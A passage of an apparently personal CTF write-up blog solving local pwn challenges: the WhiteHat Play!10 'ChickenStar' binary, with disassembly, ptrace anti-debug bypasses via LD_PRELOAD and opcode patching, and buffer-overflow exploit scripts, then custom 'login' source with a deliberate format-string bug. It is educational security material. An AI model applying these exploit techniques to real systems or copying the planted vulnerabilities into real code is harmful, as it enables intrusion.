<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">280</span>		<span class="c1"># padding
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004011b6</span><span class="p">)</span>	<span class="c1"># covid19 address
</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'Here is your chance: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvall</span><span class="p">())</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_17-08.png" alt="" /></p>

<hr />

<h1 id="whitehat-play10---pwn02">WhiteHat Play!10 - pwn02</h1>

<p><strong>Goal:</strong> Modify a volatile variable and successfully read the flag.</p>

<p>This is an original pwn challenge from WhiteHat Play10! Wargame and you can download it <a href="https://drive.google.com/file/d/1w3QMg-5BHwIr1p7OMkJLyJIVd9Ug0k9_/view?usp=sharing">here</a> or use this <a href="https://github.com/legiahuyy/dropper/blob/main/whitehat10/pwn/ChickenStar">mirror link</a>.</p>

<p>From my perspective, the challenge itself is neither difficult nor complicated and we have already had a similar one in our first part of the journey. Nevertheless, I still want to give you another example of how I go around and poke things to solve these tasks. Moreover, there is one new detail (to me, at least) in this challenge, which I thought it might intrigue you readers.</p>

<h2 id="fingerprinting-1">Fingerprinting<a href="#fingerprinting-1"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>As usual, let us check the properties of our ELF - “ChickenStar”.</p>

<p><code class="language-plaintext highlighter-rouge">radare2</code> output:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-21_08-22.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">file</code> output:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-21_08-24.png" alt="" /></p>

<p>During normal execution, the program prompts for a password then repeats our input and prints a constant value of <code class="language-plaintext highlighter-rouge">0x43563139</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar.gif" style="zoom:150%;" /></p>

<h2 id="in-depth-analysis">In-depth analysis<a href="#in-depth-analysis"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Have a glance at the functions list and their disassembly in radare2.</p>

<p>Type <code class="language-plaintext highlighter-rouge">afl</code> to list all functions.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-21_09-50.png" alt="" /></p>

<p>The binary composed of two principal functions, <code class="language-plaintext highlighter-rouge">main</code> and <code class="language-plaintext highlighter-rouge">sym.check</code>.</p>

<p>You may have noticed that the addresses are somewhat different from other challenges we have encountered and this happens by reason of the PIE protection bit (stands for <strong>P</strong>osition <strong>I</strong>ndependent <strong>E</strong>xecutable), which means every time you run the file, it gets loaded into a different memory region and this prevent hardcode values such as function addresses or gadget locations, thus making it <em>slightly</em> more difficult for ret2win, ret2libc and such others to work properly.</p>

<p>Let see what is inside <code class="language-plaintext highlighter-rouge">main</code></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre></td><td class="rouge-code"><pre>            ; DATA XREF from entry0 @ 0x5555555551a1
┌ 304: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_60h @ rbp-0x60
│           ; var int64_t var_18h @ rbp-0x18
│           0x5555555552ae      f30f1efa       endbr64
│           0x5555555552b2      55             push rbp
│           0x5555555552b3      4889e5         mov rbp, rsp
│           0x5555555552b6      53             push rbx
│           0x5555555552b7      4883ec58       sub rsp, 0x58
│           0x5555555552bb      48c745e83931.  mov qword [var_18h], 0x43563139 ; '91VC'
│           0x5555555552c3      488b05662d00.  mov rax, qword [reloc.stdin] ; [0x555555558030:8]=0
│           0x5555555552ca      b900000000     mov ecx, 0
│           0x5555555552cf      ba02000000     mov edx, 2
│           0x5555555552d4      be00000000     mov esi, 0
│           0x5555555552d9      4889c7         mov rdi, rax
│           0x5555555552dc      e86ffeffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x5555555552e1      488b05382d00.  mov rax, qword [reloc.stdout] ; [0x555555558020:8]=0
│           0x5555555552e8      b900000000     mov ecx, 0
│           0x5555555552ed      ba02000000     mov edx, 2
│           0x5555555552f2      be00000000     mov esi, 0
│           0x5555555552f7      4889c7         mov rdi, rax
│           0x5555555552fa      e851feffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x5555555552ff      488b053a2d00.  mov rax, qword [reloc.stderr] ; [0x555555558040:8]=0
│           0x555555555306      b900000000     mov ecx, 0
│           0x55555555530b      ba02000000     mov edx, 2
│           0x555555555310      be00000000     mov esi, 0
│           0x555555555315      4889c7         mov rdi, rax
│           0x555555555318      e833feffff     call sym.imp.setvbuf    ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x55555555531d      488d3d040d00.  lea rdi, str.Can_you_find_the_bank_password_to_prove_your_idols_purity_ ; 0x555555556028 ; "Can you find the bank password to prove your idols' purity!"                                                                                               
│           0x555555555324      e8c7fdffff     call sym.imp.puts       ; int puts(const char *s)
│           0x555555555329      488d3d380d00.  lea rdi, str.Enter_string_password_here_to_print_account_statement:_ ; 0x555555556068 ; "Enter string password here to print account statement: "                                                                                                      
│           0x555555555330      b800000000     mov eax, 0
│           0x555555555335      e8d6fdffff     call sym.imp.printf     ; int printf(const char *format)
│           0x55555555533a      488d45a0       lea rax, [var_60h]
│           0x55555555533e      4889c6         mov rsi, rax
│           0x555555555341      488d3d580d00.  lea rdi, [0x5555555560a0] ; "%s"
│           0x555555555348      b800000000     mov eax, 0
│           0x55555555534d      e80efeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x555555555352      488d45a0       lea rax, [var_60h]
│           0x555555555356      4889c6         mov rsi, rax
│           0x555555555359      488d3d430d00.  lea rdi, str.__s_n      ; 0x5555555560a3 ; " %s\n"
│           0x555555555360      b800000000     mov eax, 0
│           0x555555555365      e8a6fdffff     call sym.imp.printf     ; int printf(const char *format)
│           0x55555555536a      488b45e8       mov rax, qword [var_18h]
│           0x55555555536e      4889c6         mov rsi, rax
│           0x555555555371      488d3d300d00.  lea rdi, str.val:_0x_08x_n ; str.val:_0x_08x_n
│                                                                      ; 0x5555555560a8 ; "val: 0x%08x\n"                                          
│           0x555555555378      b800000000     mov eax, 0
│           0x55555555537d      e88efdffff     call sym.imp.printf     ; int printf(const char *format)
│           0x555555555382      b8efbeadde     mov eax, 0xdeadbeef
│           0x555555555387      483945e8       cmp qword [var_18h], rax
│       ┌─&lt; 0x55555555538b      752f           jne 0x5555555553bc
│       │   0x55555555538d      488d3d210d00.  lea rdi, str.Good_Job_Amazing_ ; 0x5555555560b5 ; "Good Job,Amazing!"
│       │   0x555555555394      e857fdffff     call sym.imp.puts       ; int puts(const char *s)
│       │   0x555555555399      e882fdffff     call sym.imp.geteuid    ; uid_t geteuid(void)
│       │   0x55555555539e      89c3           mov ebx, eax
│       │   0x5555555553a0      e87bfdffff     call sym.imp.geteuid    ; uid_t geteuid(void)
│       │   0x5555555553a5      89de           mov esi, ebx
│       │   0x5555555553a7      89c7           mov edi, eax
│       │   0x5555555553a9      e892fdffff     call sym.imp.setreuid
│       │   0x5555555553ae      488d3d120d00.  lea rdi, str.cat__home_ChickenStar_flag ; 0x5555555560c7 ; "cat /home/ChickenStar/flag"
│       │   0x5555555553b5      e846fdffff     call sym.imp.system     ; int system(const char *string)
│      ┌──&lt; 0x5555555553ba      eb16           jmp 0x5555555553d2
│      │└─&gt; 0x5555555553bc      488d3d250d00.  lea rdi, str.Incorrect_password_cannot_print_account_statement._Please_try_again____ ; 0x5555555560e8 ; "Incorrect password cannot print account statement. Please try again!!!!"                                                                      
│      │    0x5555555553c3      e828fdffff     call sym.imp.puts       ; int puts(const char *s)
│      │    0x5555555553c8      bf01000000     mov edi, 1
│      │    0x5555555553cd      e89efdffff     call sym.imp.exit       ; void exit(int status)
│      │    ; CODE XREF from main @ 0x5555555553ba
│      └──&gt; 0x5555555553d2      b800000000     mov eax, 0
│           0x5555555553d7      4883c458       add rsp, 0x58
│           0x5555555553db      5b             pop rbx
│           0x5555555553dc      5d             pop rbp
└           0x5555555553dd      c3             ret
</pre></td></tr></tbody></table></code></div></div>

<p>and <code class="language-plaintext highlighter-rouge">check</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>┌ 69: sym.check ();
│           0x555555555269      f30f1efa       endbr64
│           0x55555555526d      55             push rbp
│           0x55555555526e      4889e5         mov rbp, rsp
│           0x555555555271      b900000000     mov ecx, 0
│           0x555555555276      ba00000000     mov edx, 0
│           0x55555555527b      be00000000     mov esi, 0
│           0x555555555280      bf00000000     mov edi, 0
│           0x555555555285      b800000000     mov eax, 0
│           0x55555555528a      e8a1feffff     call sym.imp.ptrace     ; long ptrace(__ptrace_request request, pid_t pid, void*addr, void*data)
│           0x55555555528f      4883f8ff       cmp rax, 0xffffffffffffffff
│       ┌─&lt; 0x555555555293      7516           jne 0x5555555552ab
│       │   0x555555555295      488d3d6c0d00.  lea rdi, str.__LOL________ ; 0x555555556008 ; "========&gt; LOL!!!!!! &lt;========"
│       │   0x55555555529c      e84ffeffff     call sym.imp.puts       ; int puts(const char *s)
│       │   0x5555555552a1      bfffffffff     mov edi, 0xffffffff     ; -1
│       │   0x5555555552a6      e835feffff     call sym.imp._exit      ; void _exit(int status)
│       └─&gt; 0x5555555552ab      90             nop
│           0x5555555552ac      5d             pop rbp
└           0x5555555552ad      c3             ret
</pre></td></tr></tbody></table></code></div></div>

<p>Here are their equivalent pseudo-c.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">volatile</span> <span class="kt">long</span> <span class="n">password</span> <span class="o">=</span> <span class="mh">0x43563139</span><span class="p">;</span>
   	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">72</span><span class="p">];</span>
    
	<span class="n">puts</span><span class="p">(</span><span class="s">"Can you find the bank password to prove your idols</span><span class="se">\'</span><span class="s"> purity!"</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Enter string password here to print account statement: "</span><span class="p">);</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">" %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">local_68</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"val: 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">check</span><span class="p">);</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">password</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
    <span class="p">{</span>
	<span class="n">__euid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
	<span class="n">__ruid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
	<span class="n">setreuid</span><span class="p">(</span><span class="n">__ruid</span><span class="p">,</span><span class="n">__euid</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"cat /home/ChickenStar/flag"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Incorrect password cannot print account statement. Please try again!!!!"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">check</span><span class="p">()</span>	<span class="cm">/*sym.check*/</span>
<span class="p">{</span>
    <span class="kt">long</span> <span class="n">trace</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">trace</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">trace</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"========&gt; LOL!!!!!! &lt;========"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// Terminate entire process</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="code-breakdown-1">Code breakdown<a href="#code-breakdown-1"><i class="fas fa-hashtag"></i></a></h2></h2>

<p><code class="language-plaintext highlighter-rouge">main</code>:</p>

<ul>
  <li>Creates a buffer of 72 bytes and a volatile variable (dubbed <code class="language-plaintext highlighter-rouge">password</code>) with <code class="language-plaintext highlighter-rouge">0x43563139</code> as its value</li>
  <li>Reads and prints out the buffer as well as <code class="language-plaintext highlighter-rouge">password</code>, consecutively.</li>
  <li>Prints the flag whether <code class="language-plaintext highlighter-rouge">password</code> is equal to <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>; otherwise, exits normally</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">check</code>:</p>

<ul>
  <li>Being called during startup (<code class="language-plaintext highlighter-rouge">__libc_csu_init</code>)</li>
  <li>Traces and examines memory region and registers to act as an anti-debugging method</li>
</ul>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar2.gif" alt="" /></p>

<h2 id="solution-1">Solution<a href="#solution-1"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>In order to solve the challenge, we need to modify the volatile variable <code class="language-plaintext highlighter-rouge">password</code> to <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>. However, there is one impediment preventing us from determining the padding length or debugging the program as a result of an anti-debugging technique implemented in <code class="language-plaintext highlighter-rouge">check</code>.</p>

<p>The implementation invokes <code class="language-plaintext highlighter-rouge">ptrace</code> function to attach to our process at runtime so it can monitor and control the execution flow. You can find more information about <code class="language-plaintext highlighter-rouge">ptrace</code> by visiting this <a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man page</a>.</p>

<h3 id="signature-overridden">Signature overridden<a href="#signature-overridden"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>So we have to think of a way to bypass this anti-debugging procedure, and fortunately, we can actually achieve this by abusing the <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> environment variable as it lets us control the loading path of a shared library, hence enables us to neutralize <code class="language-plaintext highlighter-rouge">ptrace</code>.</p>

<p>Let us create a shared library with <code class="language-plaintext highlighter-rouge">ptrace</code> signature to override it</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="c1">// A "do-nothing" ptrace</span>
<span class="kt">long</span> <span class="nf">ptrace</span><span class="p">(</span><span class="kt">int</span> <span class="n">request</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>then we shall compile it as <code class="language-plaintext highlighter-rouge">gcc -shared ptrace.c -o ptrace.so</code> and load it into radare2 with the following options:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>r2 <span class="nt">-Ad</span> <span class="nt">-e</span> bin.cache<span class="o">=</span><span class="nb">true</span> <span class="nt">-Rsetenv</span><span class="o">=</span><span class="nv">LD_PRELOAD</span><span class="o">=</span>./ptrace_bypass.so ./ChickenStar
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar3.gif" alt="" /></p>

<h3 id="patching-opcodes">Patching opcodes<a href="#patching-opcodes"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>Another quick, reliable method is to patch the jump condition inside the <code class="language-plaintext highlighter-rouge">check</code> procedure.</p>

<p>Reload the binary in radare2 with write mode enabled and pay your attention to the code within<code class="language-plaintext highlighter-rouge">0x00001293</code> - <code class="language-plaintext highlighter-rouge">0x000012ab</code> range.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>┌ 69: sym.check ();
...
│           0x0000128f      4883f8ff       cmp rax, 0xffffffffffffffff
│       ┌─&lt; 0x00001293      7416           jne 0x12ab			; PATCH
│       │   0x00001295      488d3d6c0d00.  lea rdi, str.__LOL________  ; 0x2008 ; "========&gt; LOL!!!!!! &lt;========" ; const char *s
│       │   0x0000129c      e84ffeffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x000012a1      bfffffffff     mov edi, 0xffffffff         ; -1 ; int status
│       │   0x000012a6      e835feffff     call sym.imp._exit          ; void _exit(int status) &lt;--- This will exit the program and we don't want that!
│       │   ; CODE XREF from sym.check @ 0x1293
│       └─&gt; 0x000012ab      90             nop
...
</pre></td></tr></tbody></table></code></div></div>

<p>As can be seen, we have to patch the <code class="language-plaintext highlighter-rouge">JNE</code> instruction with <code class="language-plaintext highlighter-rouge">JE</code> as we want it to always take the jump to the <code class="language-plaintext highlighter-rouge">NOP</code> instruction at <code class="language-plaintext highlighter-rouge">0x000012ab</code>.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-23_11-42.png" alt="" /></p>

<p>Reopen the file and it should work properly.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/ChickenStar4.gif" alt="" /></p>

<h3 id="debugging">Debugging<a href="#debugging"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>We are finally able to debug as well as calculate the distance between our buffer and <code class="language-plaintext highlighter-rouge">password</code>. Now, let us set a breakpoint after <code class="language-plaintext highlighter-rouge">scanf</code> and have a look at the stack.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-23_14-11.png" alt="" /></p>

<p>By respectively subtracting the two offsets containing <code class="language-plaintext highlighter-rouge">0x43563139</code> and <code class="language-plaintext highlighter-rouge">0x636261</code> with each other and we thereby have our padding length of 80 bytes whereas the last 8 bytes is for <code class="language-plaintext highlighter-rouge">password</code> (<code class="language-plaintext highlighter-rouge">QWORD</code>, or <code class="language-plaintext highlighter-rouge">long</code> type).</p>

<p>Skeleton payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>payload = PADDING (72) + PASSWORD (0xdeadbeef)
</pre></td></tr></tbody></table></code></div></div>

<h2 id="solvepy-1">Solve.py<a href="#solvepy-1"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>This challenge can be solve with this simple one-liner</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"print b'A'*72 + b'</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">ad</span><span class="se">\x</span><span class="s2">de'"</span> | ./ChickenStar 
</pre></td></tr></tbody></table></code></div></div>

<p>or you want to play around with pwntools more then here:</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./ChickenStar'</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">72</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'account statement: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">clean</span><span class="p">())</span> 
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-23_17-00.png" alt="" /></p>

<h1 id="login-custom">login (custom)</h1>

<p><strong>Goal:</strong> Be able to fully comprehend the format string vulnerability as well as other protection bits (e.g., PIE/PIC, canary, ASLR and RELRO).</p>

<p>In the previous tasks, we have been repeatedly mentioning PIE/PIC, format string vulnerability and canaries but did not go in detail. Considering that, I have made a customized challenge as a nice little <em>stopover</em> for you readers to practice and have a concrete understanding about the aforementioned concepts.</p>

<p>The challenge also comes with its source code and build options, feel free to reproduce or modify it to your liking and it is strongly recommended that you should try to complete the tasks to some extent before reaching the solution part.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="c1">//Build: $ gcc -g readme.c -o readme -pie -fstack-protector -z execstack </span>
<span class="c1">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux</span>

<span class="cp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt">long</span> <span class="n">authen_code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">login</span><span class="p">();</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">();</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> 
<span class="p">{</span>
	<span class="n">login</span><span class="p">();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Congratulation! You've won!</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">login</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kt">char</span> <span class="n">creds</span><span class="p">[</span><span class="mi">255</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'\0'</span> <span class="p">};</span>
	<span class="n">authen_code</span> <span class="o">=</span> <span class="mh">0xBADF00D</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Welcome to %lx sector!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">login</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Enter credentials: "</span><span class="p">);</span>
	<span class="n">fgets</span><span class="p">(</span><span class="n">creds</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">creds</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Verifying..."</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="n">creds</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="mh">0x1ee71ee7</span> <span class="o">==</span> <span class="n">authen_code</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Nice job!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Now gotta call win()!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">else</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Your authen_code is invalid!</span><span class="se">\n</span><span class="s">authen_code = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">authen_code</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="fingerprinting-2">Fingerprinting<a href="#fingerprinting-2"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Expected output during normal run</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/login1.gif" alt="" /></p>

<p>and the properties.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="o">[</span>0x00001090]&gt; iI~nx,relro,canary,bits,pic
bits     64
canary   <span class="nb">true
</span>nx       <span class="nb">true
</span>pic      <span class="nb">true
</span>relro    partial
</pre></td></tr></tbody></table></code></div></div>

<p>As demonstrated, the program reads from STDIN, prints a welcome message with our input and carries out a conditional jump before exiting. In most scenarios, this conventional functionality of printing out exact input values is likely an indication of information leakage, herein the format string vulnerability.</p>

<p>You can try confirming it by feeding the buffer with <strong>format specifiers</strong> then see if there are any odd values printed out. Let us use <code class="language-plaintext highlighter-rouge">%p</code> which is a pointer specifier and here is the result:</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-31_09-12.png" alt="" /></p>

<p>You can go back to and read the previous example about format string in part one - <a href="https://legiahuyy.github.io/blog/en/posts/pwns-1/#solution-3">canary</a>.</p>

